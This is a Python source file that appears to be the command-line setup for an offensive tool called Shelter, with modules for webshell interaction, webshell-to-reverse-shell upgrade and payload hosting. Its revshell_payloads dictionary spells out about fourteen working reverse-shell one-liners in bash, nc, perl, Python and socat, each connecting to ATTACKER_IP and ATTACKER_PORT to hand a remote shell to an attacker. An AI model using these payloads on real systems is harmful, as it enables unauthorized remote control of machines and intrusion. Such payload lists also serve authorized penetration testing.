import argparse
from shelter.helpers.stylize import *

web_args = {
        "url" : {
            "help": "Target URL [http://127.0.0.1/cmd.php]",
            "metavar": "URL"
        },
        "-f" : {
            "help": "Filename of the webshell [Default : cmd.php]. Incase you enter only ip in url arg.",
            "metavar" : "cmd.php"
        },
        "--param" : {
            "help": "GET parameter to send commands.[Default: cmd]"
        },
        "--ssl" : {
            "help": "Force HTTPS",
            "action": "store_true"
        },
        "--nossl" : {
            "help": "Force downgrade to HTTP",
            "action": "store_true"
        }
    }

revshell_args = {
    "-i" : {
        "action" : "store",
        "metavar" : "127.0.0.1",
        "help" : "IP for reverse shell."
        },
    "-p" : {
        "action" : "store",
        "metavar" : "8888",
        "help" : "For Attacker PORT"
        },
    "--nohandler" : {
        "action" : "store_true",
        "help" : "Copies only the revshell payload. [Does not start handler]"
        }  
}

revshell_payloads = {
    "bash" : {
            "help" : "echo base64_encoded_bash-i_payload |base64 -d|bash",
            "args" : revshell_args},
    "bashi" : {
            "help" : "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1",
            "args" : revshell_args},
    "bash196" : {
            "help" : "0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; bash <&196 >&196 2>&196",
            "args" : revshell_args},
    "bashrl" : {
            "help" : "exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done",
            "args" : revshell_args},
    "bash5" : {
            "help" : "bash -i 5<> /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0<&5 1>&5 2>&5",
            "args" : revshell_args},
    "bashudp" : {
            "help" : "bash -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1",
            "args" : revshell_args},
    "nc_mkfifo" : {
            "help" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f",
            "args" : revshell_args},
    "perl" : {
            "help" : """perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""",
            "args" : revshell_args},
    "py2" : {
            "help" : """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
            "args" : revshell_args},
    "py" : {
            "help" : """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
            "args" : revshell_args},
    "py2export" : {
            "help" : """export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
            "args" : revshell_args},
    "pyexport" : {
            "help" : """export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")""",
            "args" : revshell_args},
    "socat" : {
            "help" : "socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane",
            "args" : revshell_args},
}

modules = {
    "rev" : {
        "help" : "Revshell to clipboard",
        "data" : {"payload" : revshell_payloads}
        },
    "web": {
        "help" : "Webshell interactor",
        "data" : {"args" : web_args}
        },
    "webrev" : {
        "help" : "Webshell to Revshell",
        "data" : {
            "args" : web_args,
            "payload" : revshell_payloads
            } 
        },
    "host" : {
        "help" : "Copies a reverse shell file in pwd and hosts it and copies the ip to your clipboard",
        "data" : {}
        }
}

def generate_cli_args():
    global parser 
    parser= argparse.ArgumentParser(description=f"""
{bold}{green}
   _____ __         ____           
  / ___// /_  ___  / / /____  _____
  \__ \/ __ \/ _ \/ / __/ _ \/ ___/
 ___/ / / / /  __/ / /_/  __/ /    
/____/_/ /_/\___/_/\__/\___/_/     

{end}{bold}{red}To boldly catch shells even the size of a meteorite.      
{end}{bold}{orange}Version: v2.0.0 - 11/06/21 - Bides Das @Xyan1d3 {end}""",formatter_class=argparse.RawTextHelpFormatter)
    
    subparser = parser.add_subparsers(title="Available Modules", dest="module")
    for module_name,module_data in modules.items():
        subp = subparser.add_parser(module_name,help=module_data["help"])
        if "args" in module_data["data"]:
            for flags,flag_data in module_data["data"]["args"].items():
                subp.add_argument(flags,**flag_data) 
        if "payload" in module_data["data"]:
            subsubp = subp.add_subparsers(title="Available Payloads",dest='lang',help=False)
            for payload,payload_data in revshell_payloads.items():
                subsubsubp = subsubp.add_parser(payload,help=payload_data["help"])
                for flags,flags_data in payload_data["args"].items():
                    subsubsubp.add_argument(flags,**flags_data)
    args = parser.parse_args()
    return args